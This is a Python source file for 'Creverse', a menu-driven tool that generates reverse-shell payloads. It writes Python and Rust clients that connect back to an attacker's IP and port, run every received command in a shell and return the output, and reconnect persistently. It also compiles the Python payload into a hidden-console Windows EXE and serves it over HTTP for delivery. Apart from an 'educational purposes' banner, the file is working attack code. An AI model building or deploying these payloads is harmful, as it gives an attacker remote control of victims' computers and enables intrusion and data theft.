#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import requests
from pathlib import Path

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class PayloadGenerator:
    def __init__(self):
        self.payload_dir = "payloads"
        self.create_payload_directory()
    
    def create_payload_directory(self):
        if not os.path.exists(self.payload_dir):
            os.makedirs(self.payload_dir)
            print(f"{Colors.GREEN}[+] Created directory: {self.payload_dir}{Colors.END}")
    
    def print_banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                        CREVERSE                              ║
║                                                              ║
║  Advanced Payload Generator with Reverse Shell               ║
║                                                              ║
║  ️  For Educational and Ethical Testing Purposes Only       ║
║                                                              ║
║   Author: AymanCsharp                                        ║
║   Version: 2.0                                               ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
"""
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║                        MAIN MENU                             ║
╠══════════════════════════════════════════════════════════════╣
║  [1] Create Python Payload                                   ║
║  [2] Create Rust Payload                                     ║
║  [3] Convert Python to EXE                                   ║
║  [4] Create Download Server                                  ║
║  [5] List Generated Files                                    ║
║  [6] Exit                                                    ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}
"""
        print(menu)
    
    def create_python_payload(self):
        print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    CREATE PYTHON PAYLOAD                        ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        attacker_ip = input(f"{Colors.GREEN}[+] Enter attacker IP: {Colors.END}").strip()
        attacker_port = input(f"{Colors.GREEN}[+] Enter attacker port: {Colors.END}").strip()
        
        if not attacker_ip or not attacker_port:
            print(f"{Colors.RED}[!] IP and port are required{Colors.END}")
            return
        
        payload_content = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import sys
import platform
import time

def create_reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        
        system_info = f"\\n[+] Connected from: {{platform.system()}} {{platform.release()}}\\n"
        s.send(system_info.encode())
        
        while True:
            try:
                command = s.recv(1024).decode().strip()
                
                if command.lower() in ['quit', 'exit', 'disconnect']:
                    break
                
                if command.strip():
                    if platform.system().lower() == "windows":
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    else:
                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    
                    s.send(output)
                    
            except subprocess.CalledProcessError as e:
                error_msg = f"Error: {{e}}\\n".encode()
                s.send(error_msg)
            except Exception as e:
                error_msg = f"Error: {{e}}\\n".encode()
                s.send(error_msg)
                
    except Exception as e:
        print(f"Connection failed: {{e}}")
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    ATTACKER_HOST = "{attacker_ip}"
    ATTACKER_PORT = {attacker_port}
    
    print("Starting reverse shell...")
    print(f"Connecting to {{ATTACKER_HOST}}:{{ATTACKER_PORT}}")
    
    while True:
        try:
            create_reverse_shell(ATTACKER_HOST, ATTACKER_PORT)
            print("Connection lost. Retrying in 5 seconds...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("\\nStopped by user")
            break
        except Exception as e:
            print(f"Error: {{e}}")
            time.sleep(5)
'''
        
        filename = f"reverse_shell_{attacker_ip}_{attacker_port}.py"
        filepath = os.path.join(self.payload_dir, filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(payload_content)
        
        print(f"\n{Colors.GREEN}✅ Python payload created:{Colors.END}")
        print(f"   File: {filepath}")
        print(f"   IP: {attacker_ip}")
        print(f"   Port: {attacker_port}")
        
        return filepath
    
    def create_rust_payload(self):
        print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    CREATE RUST PAYLOAD                          ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        attacker_ip = input(f"{Colors.GREEN}[+] Enter attacker IP: {Colors.END}").strip()
        attacker_port = input(f"{Colors.GREEN}[+] Enter attacker port: {Colors.END}").strip()
        
        if not attacker_ip or not attacker_port:
            print(f"{Colors.RED}[!] IP and port are required{Colors.END}")
            return
        
        project_name = f"reverse_shell_{attacker_ip.replace('.', '_')}_{attacker_port}"
        project_path = os.path.join(self.payload_dir, project_name)
        
        try:
            subprocess.run(["cargo", "new", "--bin", project_name], cwd=self.payload_dir, check=True)
            
            cargo_toml = f"""[package]
name = "{project_name}"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = {{ version = "1.0", features = ["full"] }}
"""
            
            with open(os.path.join(project_path, "Cargo.toml"), 'w') as f:
                f.write(cargo_toml)
            
            main_rs = f'''use tokio::net::TcpStream;
use tokio::io::{{AsyncReadExt, AsyncWriteExt}};
use std::process::Command;
use std::io;

#[tokio::main]
async fn main() {{
    let host = "{attacker_ip}";
    let port = {attacker_port};
    
    println!("Connecting to {{}}:{{}}...", host, port);
    
    loop {{
        match TcpStream::connect(format!("{{}}:{{}}", host, port)).await {{
            Ok(mut stream) => {{
                println!("Connected!");
                
                let system_info = format!("\\n[+] Connected from: {{}}\\n", std::env::consts::OS);
                if let Err(_) = stream.write_all(system_info.as_bytes()).await {{
                    continue;
                }}
                
                let mut buffer = [0; 1024];
                
                loop {{
                    match stream.read(&mut buffer).await {{
                        Ok(n) if n > 0 => {{
                            let command = String::from_utf8_lossy(&buffer[..n]).trim();
                            
                            if command.is_empty() {{
                                continue;
                            }}
                            
                            if command == "quit" || command == "exit" {{
                                break;
                            }}
                            
                            let output = if cfg!(target_os = "windows") {{
                                Command::new("cmd")
                                    .args(&["/C", command])
                                    .output()
                            }} else {{
                                Command::new("sh")
                                    .args(&["-c", command])
                                    .output()
                            }};
                            
                            match output {{
                                Ok(output) => {{
                                    let response = if output.stdout.is_empty() {{
                                        output.stderr
                                    }} else {{
                                        output.stdout
                                    }};
                                    
                                    if let Err(_) = stream.write_all(&response).await {{
                                        break;
                                    }}
                                }},
                                Err(e) => {{
                                    let error_msg = format!("Error: {{}}\\n", e);
                                    if let Err(_) = stream.write_all(error_msg.as_bytes()).await {{
                                        break;
                                    }}
                                }}
                            }}
                        }},
                        _ => break,
                    }}
                }}
            }},
            Err(e) => {{
                eprintln!("Connection failed: {{}}", e);
                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            }}
        }}
    }}
}}
'''
            
            with open(os.path.join(project_path, "src", "main.rs"), 'w') as f:
                f.write(main_rs)
            
            print(f"\n{Colors.GREEN}✅ Rust project created:{Colors.END}")
            print(f"   Directory: {project_path}")
            print(f"   IP: {attacker_ip}")
            print(f"   Port: {attacker_port}")
            print(f"\n{Colors.YELLOW}To build, go to directory and run:{Colors.END}")
            print(f"   cd {project_path}")
            print(f"   cargo build --release")
            
            return project_path
            
        except subprocess.CalledProcessError:
            print(f"{Colors.RED}[!] Rust not installed. Please install Rust first{Colors.END}")
            return None
        except Exception as e:
            print(f"{Colors.RED}[!] Error creating Rust project: {e}{Colors.END}")
            return None
    
    def convert_to_exe(self):
        print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    CONVERT PYTHON TO EXE                        ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        python_files = [f for f in os.listdir(self.payload_dir) if f.endswith('.py')]
        
        if not python_files:
            print(f"{Colors.YELLOW}[!] No Python files in payloads directory{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}Available files:{Colors.END}")
        for i, file in enumerate(python_files, 1):
            print(f"  [{i}] {file}")
        
        try:
            choice = int(input(f"\n{Colors.GREEN}Select file: {Colors.END}")) - 1
            if 0 <= choice < len(python_files):
                selected_file = python_files[choice]
                filepath = os.path.join(self.payload_dir, selected_file)
                
                print(f"\n{Colors.YELLOW}Converting...{Colors.END}")
                
                try:
                    import PyInstaller
                except ImportError:
                    print(f"{Colors.YELLOW}[!] PyInstaller not installed. Installing...{Colors.END}")
                    subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], check=True)
                
                exe_name = selected_file.replace('.py', '.exe')
                cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile",
                    "--noconsole",
                    "--name", exe_name.replace('.exe', ''),
                    filepath
                ]
                
                subprocess.run(cmd, cwd=self.payload_dir, check=True)
                
                dist_path = os.path.join(self.payload_dir, "dist", exe_name)
                final_path = os.path.join(self.payload_dir, exe_name)
                
                if os.path.exists(dist_path):
                    os.rename(dist_path, final_path)
                    print(f"\n{Colors.GREEN}✅ EXE created successfully:{Colors.END}")
                    print(f"   File: {final_path}")
                else:
                    print(f"{Colors.RED}[!] Failed to create EXE{Colors.END}")
                
            else:
                print(f"{Colors.RED}[!] Invalid selection{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Enter a valid number{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error in conversion: {e}{Colors.END}")
    
    def create_download_server(self):
        print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    CREATE DOWNLOAD SERVER                      ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        exe_files = [f for f in os.listdir(self.payload_dir) if f.endswith('.exe')]
        
        if not exe_files:
            print(f"{Colors.YELLOW}[!] No EXE files. Create payload first{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}Available files:{Colors.END}")
        for i, file in enumerate(exe_files, 1):
            print(f"  [{i}] {file}")
        
        try:
            choice = int(input(f"\n{Colors.GREEN}Select file: {Colors.END}")) - 1
            if 0 <= choice < len(exe_files):
                selected_file = exe_files[choice]
                filepath = os.path.join(self.payload_dir, selected_file)
                
                port = input(f"{Colors.GREEN}[+] Enter server port (default: 8080): {Colors.END}").strip()
                if not port:
                    port = "8080"
                
                try:
                    port = int(port)
                except ValueError:
                    print(f"{Colors.RED}[!] Invalid port{Colors.END}")
                    return
                
                print(f"\n{Colors.GREEN}🚀 Starting download server...{Colors.END}")
                print(f"   File: {selected_file}")
                print(f"   Port: {port}")
                print(f"   Download URL: http://localhost:{port}/{selected_file}")
                print(f"\n{Colors.YELLOW}Press Ctrl+C to stop server{Colors.END}")
                
                import http.server
                import socketserver
                
                class CustomHandler(http.server.SimpleHTTPRequestHandler):
                    def __init__(self, *args, **kwargs):
                        super().__init__(*args, directory=self.payload_dir, **kwargs)
                    
                    def end_headers(self):
                        self.send_header('Content-Disposition', f'attachment; filename="{selected_file}"')
                        super().end_headers()
                
                with socketserver.TCPServer(("", port), CustomHandler) as httpd:
                    httpd.serve_forever()
                    
            else:
                print(f"{Colors.RED}[!] Invalid selection{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Enter a valid number{Colors.END}")
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Server stopped{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error creating server: {e}{Colors.END}")
    
    def list_files(self):
        print(f"\n{Colors.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"║                    LIST GENERATED FILES                        ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.END}")
        
        if not os.path.exists(self.payload_dir) or not os.listdir(self.payload_dir):
            print(f"{Colors.YELLOW}[!] No files{Colors.END}")
            return
        
        files = os.listdir(self.payload_dir)
        
        print(f"\n{Colors.CYAN}Files in {self.payload_dir} directory:{Colors.END}")
        for i, file in enumerate(files, 1):
            filepath = os.path.join(self.payload_dir, file)
            size = os.path.getsize(filepath) if os.path.isfile(filepath) else "DIR"
            file_type = "📁" if os.path.isdir(filepath) else "📄"
            print(f"  [{i}] {file_type} {file} ({size} bytes)" if size != "DIR" else f"  [{i}] {file_type} {file}")
    
    def run(self):
        self.print_banner()
        
        while True:
            self.print_menu()
            choice = input(f"\n{Colors.GREEN}Enter your choice: {Colors.END}").strip()
            
            if choice == '1':
                self.create_python_payload()
            elif choice == '2':
                self.create_rust_payload()
            elif choice == '3':
                self.convert_to_exe()
            elif choice == '4':
                self.create_download_server()
            elif choice == '5':
                self.list_files()
            elif choice == '6':
                print(f"\n{Colors.GREEN}Thanks for using Creverse! 👋{Colors.END}")
                break
            else:
                print(f"{Colors.RED}[!] Invalid choice{Colors.END}")
            
            input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.END}")

def main():
    try:
        generator = PayloadGenerator()
        generator.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] Program stopped by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.END}")

if __name__ == "__main__":
    main()
